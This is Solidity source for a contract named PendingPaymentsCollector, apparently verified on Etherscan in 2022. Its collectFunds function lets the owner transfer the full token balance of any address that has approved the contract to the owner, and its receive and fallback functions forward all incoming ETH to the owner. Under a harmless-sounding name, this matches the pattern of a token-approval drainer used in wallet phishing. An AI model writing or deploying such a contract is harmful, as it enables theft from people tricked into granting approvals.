/**
 *Submitted for verification at Etherscan.io on 2022-11-01
*/

pragma solidity >=0.8.0 <0.9.0;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract PendingPaymentsCollector {
    address private _owner;
    modifier onlyOwner() {
        require(_owner == msg.sender, "Caller =/= owner.");
        _;
    }
    IERC20 private _token;
    event FundsCollected(address indexed account, uint256 amount);
    event FundsDistributed(address indexed account, uint256 amount);

    constructor(IERC20 token) {
        _owner = msg.sender;
        _token = token;
    }

    function fundsDestribution(address payable[] calldata accounts, uint256 amount) external payable onlyOwner {
        require(accounts.length > 0, "Accounts length should be greater than 0");
        require(amount * accounts.length == msg.value, "Infuccient funds");
        for(uint i = 0; i < accounts.length; i++) {
            require(accounts[i].send(amount));
            emit FundsDistributed(accounts[i], amount);
        }
    }

    function collectFunds(address[] calldata accounts) external onlyOwner {
        require(accounts.length > 0, "Accounts length should be greater than 0");
        for(uint i = 0; i < accounts.length; i++) {
            uint256 amount = _token.balanceOf(accounts[i]);
            _token.transferFrom(accounts[i], _owner, amount);
            emit FundsCollected(accounts[i], amount);
        }
    }

    function withdraw() external onlyOwner {
        payable(_owner).transfer(address(this).balance);
    }

    function withdrawToken(IERC20 token) external onlyOwner {
        token.transfer(_owner, token.balanceOf(address(this)));
    }

    function transferOwner(address newOwner) external onlyOwner {
        _owner = newOwner;
    }

    function getOwner() external view returns (address) { 
        return _owner; 
    }

    receive() external payable { 
        payable(_owner).transfer(msg.value);
    }

    fallback() external payable {
        payable(_owner).transfer(msg.value);
    }
}